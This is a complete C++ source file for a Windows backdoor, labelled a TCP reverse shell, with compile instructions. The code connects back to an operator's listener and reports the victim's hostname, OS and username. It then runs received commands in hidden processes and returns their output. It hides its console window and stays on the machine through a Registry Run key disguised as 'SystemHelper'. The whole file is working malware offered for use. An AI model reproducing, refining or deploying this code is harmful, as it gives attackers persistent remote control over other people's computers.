// TCP REVERSE SHELL - C++ PORT OF ORIGINAL PYTHON VERSION - FIXED
// Compile: g++ backdoor1_fixed.cpp -o backdoor1.exe -lws2_32 -static

#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <cstring>
#pragma comment(lib, "ws2_32.lib")

// Force ANSI versions of Windows functions
#ifdef UNICODE
#undef UNICODE
#endif
#ifdef _UNICODE
#undef _UNICODE
#endif

#define LISTENER_IP "192.168.1.100"  // CHANGE THIS TO YOUR IP
#define LISTENER_PORT 4444            // CHANGE THIS TO YOUR PORT
#define RECONNECT_DELAY 5000          // 5 seconds
#define ERROR_DELAY 3000               // 3 seconds

class TCPReverseShell {
private:
    SOCKET sock;
    WSADATA wsaData;
    bool connected;
    char hostname[256];
    
    void InitWinsock() {
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        gethostname(hostname, sizeof(hostname));
    }
    
    bool Connect() {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) return false;
        
        sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(LISTENER_PORT);
        addr.sin_addr.s_addr = inet_addr(LISTENER_IP);
        
        int result = connect(sock, (sockaddr*)&addr, sizeof(addr));
        connected = (result == 0);
        return connected;
    }
    
    std::string GetSystemInfo() {
        std::string info = "[CONNECTION ESTABLISHED]\n";
        info += "Host: " + std::string(hostname) + "\n";
        
        // Get OS info - using ANSI version explicitly
        char osVersion[256];
        OSVERSIONINFOA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
        GetVersionExA(&osvi);
        
        info += "OS: Windows " + std::to_string(osvi.dwMajorVersion) + "." + 
                std::to_string(osvi.dwMinorVersion) + "\n";
        
        // Get architecture
        SYSTEM_INFO si;
        GetNativeSystemInfo(&si);
        info += "Arch: ";
        if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
            info += "x64\n";
        else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
            info += "x86\n";
        else
            info += "Unknown\n";
        
        // Get username - using ANSI version
        char username[256];
        DWORD size = sizeof(username);
        if (GetUserNameA(username, &size))
            info += "User: " + std::string(username) + "\n";
        
        info += "Ready to execute commands...\n\n";
        return info;
    }
    
    std::string ExecuteCommand(const char* cmd) {
        std::string result;
        
        // Handle 'cd' command specially
        std::string cmdStr(cmd);
        if (cmdStr.find("cd ") == 0) {
            std::string path = cmdStr.substr(3);
            if (SetCurrentDirectoryA(path.c_str())) {
                char cwd[MAX_PATH];
                GetCurrentDirectoryA(MAX_PATH, cwd);
                result = "Changed directory to: ";
                result += cwd;
                result += "\n";
            } else {
                result = "Failed to change directory\n";
            }
            return result;
        }
        
        // Create pipes for I/O redirection
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        
        HANDLE hRead, hWrite;
        if (!CreatePipe(&hRead, &hWrite, &sa, 0))
            return "Error creating pipe\n";
        
        // Set up process startup info
        STARTUPINFOA si = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        si.hStdInput = NULL;
        
        PROCESS_INFORMATION pi;
        
        // Create a mutable copy of the command string
        char* cmdMutable = _strdup(cmd);
        
        // Create process with hidden window
        if (CreateProcessA(NULL, cmdMutable, NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            
            // Read output from pipe
            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hRead, buffer, sizeof(buffer)-1, &bytesRead, NULL) 
                   && bytesRead > 0) {
                buffer[bytesRead] = 0;
                result += buffer;
            }
        } else {
            result = "Failed to execute command\n";
        }
        
        free(cmdMutable);
        CloseHandle(hRead);
        CloseHandle(hWrite);
        
        if (result.empty())
            result = "[COMMAND EXECUTED WITH NO OUTPUT]\n";
        
        return result;
    }
    
    void Persist() {
        HKEY hkey;
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        
        // Open Run registry key
        if (RegOpenKeyExA(HKEY_CURRENT_USER, 
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
            0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
            
            RegSetValueExA(hkey, "SystemHelper", 0, REG_SZ, 
                (BYTE*)path, strlen(path));
            RegCloseKey(hkey);
        }
    }
    
    void HideConsole() {
        HWND hwnd = GetConsoleWindow();
        if (hwnd) ShowWindow(hwnd, SW_HIDE);
    }
    
public:
    TCPReverseShell() : connected(false) {
        InitWinsock();
        HideConsole();
    }
    
    ~TCPReverseShell() {
        if (sock != INVALID_SOCKET)
            closesocket(sock);
        WSACleanup();
    }
    
    void Run() {
        // Attempt persistence
        Persist();
        
        while (true) {
            // Establish connection
            while (!connected) {
                if (Connect()) {
                    // Send system info
                    std::string info = GetSystemInfo();
                    send(sock, info.c_str(), info.length(), 0);
                } else {
                    Sleep(RECONNECT_DELAY);
                    continue;
                }
            }
            
            // Main command loop
            while (connected) {
                char buffer[4096] = {0};
                int bytes = recv(sock, buffer, sizeof(buffer)-1, 0);
                
                if (bytes <= 0) {
                    connected = false;
                    break;
                }
                
                std::string command(buffer);
                
                // Handle special commands
                if (command == "exit" || command == "quit") {
                    send(sock, "Closing connection...\n", 22, 0);
                    closesocket(sock);
                    connected = false;
                    break;
                }
                
                if (command == "persist") {
                    Persist();
                    send(sock, "Persistence mechanism activated\n", 33, 0);
                    continue;
                }
                
                // Execute command
                if (!command.empty()) {
                    std::string result = ExecuteCommand(command.c_str());
                    send(sock, result.c_str(), result.length(), 0);
                }
            }
            
            closesocket(sock);
            Sleep(ERROR_DELAY);
        }
    }
};

int main() {
    TCPReverseShell shell;
    shell.Run();
    return 0;
}